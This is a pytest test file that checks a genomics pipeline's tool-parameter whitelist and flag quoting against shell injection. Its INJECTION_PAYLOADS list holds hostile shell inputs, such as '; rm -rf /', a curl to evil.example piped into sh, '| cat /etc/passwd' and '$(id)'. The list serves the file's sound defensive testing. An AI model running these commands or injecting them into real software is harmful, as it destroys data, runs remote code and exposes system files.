"""Shell-safety tripwires for the tool parameter whitelist.

`templates/bcftools.py` interpolates the built flag strings into a `sh -lc`
script that runs inside the container. That is safe today only because
`validate_and_build_flags` can emit nothing but numbers and exact members of
hardcoded enum lists — the whole defence rests on the parameter type system.
The moment someone adds a free-string parameter (a sample name, an output
prefix, a filter expression) the type system stops protecting anything and the
interpolation becomes live shell injection on every validator. These tests are
what fails on that day.
"""

import re

import pytest

from templates.bcftools import _quote_flags
from templates.tool_params import (
    BCFTOOLS_QUALITY_PARAMS,
    DEEPVARIANT_QUALITY_PARAMS,
    FREEBAYES_QUALITY_PARAMS,
    GATK_QUALITY_PARAMS,
    validate_and_build_flags,
)

TOOL_PARAMS = {
    "gatk": GATK_QUALITY_PARAMS,
    "deepvariant": DEEPVARIANT_QUALITY_PARAMS,
    "freebayes": FREEBAYES_QUALITY_PARAMS,
    "bcftools": BCFTOOLS_QUALITY_PARAMS,
}

# Every type that carries its own value-domain check in validate_and_build_flags.
# "str" is deliberately absent: a str-typed param matches none of the validation
# branches there and falls straight through to flag building, unvalidated.
SAFE_PARAM_TYPES = {"int", "float", "bool", "enum"}

FLAG_KEYS = ("flag", "flag_mpileup", "flag_call")

# Anything outside this set can change how a shell parses the command line:
# quotes, redirects, substitution, separators, globs, newlines.
SAFE_TOKEN = re.compile(r"^[A-Za-z0-9_.,:=+/@-]*$")

INJECTION_PAYLOADS = [
    "; rm -rf /",
    "&& curl http://evil.example/x | sh",
    "| cat /etc/passwd",
    "$(id)",
    "`id`",
    "\nid\n",
    "' ; id ; '",
    '" ; id ; "',
    "> /output/pwned",
    "x; touch /tmp/pwned",
    "GRCh38; id",
    "*",
    "$IFS",
    "\\",
]


def _shell_tokens(flag_entry) -> list:
    """Split one built flag into the tokens the container shell would see."""
    if isinstance(flag_entry, dict):
        text = flag_entry.get("flag", flag_entry.get("param", ""))
    else:
        text = flag_entry
    # Flags are built as "FLAG VALUE"; splitting once is exactly how
    # _quote_flags treats them, so this checks the same units it quotes.
    return text.split(" ", 1)


def _assert_shell_safe(flag_entry, context: str):
    for token in _shell_tokens(flag_entry):
        assert SAFE_TOKEN.match(token), (
            f"{context}: built flag token {token!r} contains a character the "
            f"container shell would interpret (from {flag_entry!r})"
        )


def _all_tool_params():
    for tool, params in TOOL_PARAMS.items():
        for name, definition in params.items():
            yield tool, name, definition


class TestParameterDefinitionsAreShellSafe:
    """Static audit of every parameter definition in tool_params.py."""

    @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
    def test_param_type_is_value_checked(self, tool, name, definition):
        """A str-typed param would reach the shell with no validation at all."""
        assert definition["type"] in SAFE_PARAM_TYPES, (
            f"{tool}.{name} is typed {definition['type']!r}, which "
            f"validate_and_build_flags does not range- or membership-check. Its "
            f"value would be interpolated into the bcftools `sh -lc` script "
            f"as-is. Add a validation branch for that type before adding the param."
        )

    @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
    def test_flag_literal_is_shell_safe(self, tool, name, definition):
        for key in FLAG_KEYS:
            if key in definition:
                _assert_shell_safe(definition[key], f"{tool}.{name}.{key}")

    @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
    def test_enum_values_are_shell_safe(self, tool, name, definition):
        """Enum members are interpolated verbatim, so the list itself must be clean."""
        for value in definition.get("allowed_values", []):
            assert SAFE_TOKEN.match(str(value)), (
                f"{tool}.{name} allows {value!r}, which the shell would interpret"
            )

    @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
    def test_built_flags_are_shell_safe_at_every_legal_extreme(self, tool, name, definition):
        """Build each param at default/min/max/both-bools and audit the result."""
        candidates = [definition["default"]]
        if definition["type"] in ("int", "float"):
            candidates += [definition["min"], definition["max"]]
        elif definition["type"] == "enum":
            candidates += list(definition["allowed_values"])
        elif definition["type"] == "bool":
            candidates += [True, False]

        for value in candidates:
            result = validate_and_build_flags(tool, {name: value})
            assert result["valid"], (
                f"{tool}.{name}={value!r} is a documented legal value but was "
                f"rejected: {result['errors']}"
            )
            for flag_entry in result["flags"]:
                _assert_shell_safe(flag_entry, f"{tool}.{name}={value!r}")


class TestInjectionThroughValidateAndBuildFlags:
    """Hostile values must be rejected, or at minimum never reach the shell intact."""

    @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
    def test_hostile_values_are_rejected(self, tool, name, definition):
        for payload in INJECTION_PAYLOADS:
            result = validate_and_build_flags(tool, {name: payload})
            assert not result["valid"], (
                f"{tool}.{name} accepted the shell payload {payload!r} and built "
                f"{result['flags']!r}"
            )
            assert result["flags"] == [], (
                f"{tool}.{name} rejected {payload!r} but still emitted "
                f"{result['flags']!r}"
            )

    @pytest.mark.parametrize("tool", sorted(TOOL_PARAMS))
    def test_unknown_param_name_cannot_smuggle_a_flag(self, tool):
        """The param name itself is attacker-supplied; it must never become a flag."""
        for payload in INJECTION_PAYLOADS:
            result = validate_and_build_flags(tool, {f"evil{payload}": 1})
            assert not result["valid"]
            assert result["flags"] == []

    @pytest.mark.parametrize("tool", sorted(TOOL_PARAMS))
    def test_one_bad_param_invalidates_the_whole_config(self, tool):
        """A hostile param alongside legal ones must not leave `valid` True."""
        legal = {}
        for name, definition in TOOL_PARAMS[tool].items():
            legal[name] = definition["default"]
            break
        hostile = dict(legal)
        hostile["not_a_real_param"] = "; id"
        result = validate_and_build_flags(tool, hostile)
        assert not result["valid"]


class TestBcftoolsFlagQuoting:
    """`_quote_flags` is the second line of defence in templates/bcftools.py."""

    def test_quoting_does_not_change_todays_commands(self):
        """Quoting must be a no-op for every flag the whitelist can produce.

        If this fails, the quoting change altered a live bcftools invocation and
        every submission's variant calls with it.
        """
        for name, definition in BCFTOOLS_QUALITY_PARAMS.items():
            values = [definition["default"]]
            if definition["type"] in ("int", "float"):
                values += [definition["min"], definition["max"]]
            elif definition["type"] == "enum":
                values += list(definition["allowed_values"])
            elif definition["type"] == "bool":
                values.append(True)

            for value in values:
                result = validate_and_build_flags("bcftools", {name: value})
                assert result["valid"], result["errors"]
                flags = [f["flag"] for f in result["flags"]]
                assert _quote_flags(flags) == " ".join(flags), (
                    f"quoting changed the command for {name}={value!r}: "
                    f"{_quote_flags(flags)!r} != {' '.join(flags)!r}"
                )

    def test_empty_flag_list_renders_empty(self):
        assert _quote_flags([]) == ""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_hypothetical_string_param_cannot_break_out(self, payload):
        """Simulate the free-string param that does not exist yet.

        The whitelist stops these values today, so this exercises _quote_flags
        directly: even handed a hostile value it must render as one shell word.
        """
        import shlex

        quoted = _quote_flags([f"--sample-name {payload}"])
        tokens = shlex.split(quoted)
        assert tokens == ["--sample-name", payload], (
            f"{payload!r} escaped its argument: {quoted!r} -> {tokens!r}"
        )
        assert "\n" not in quoted or quoted.count("'") >= 2
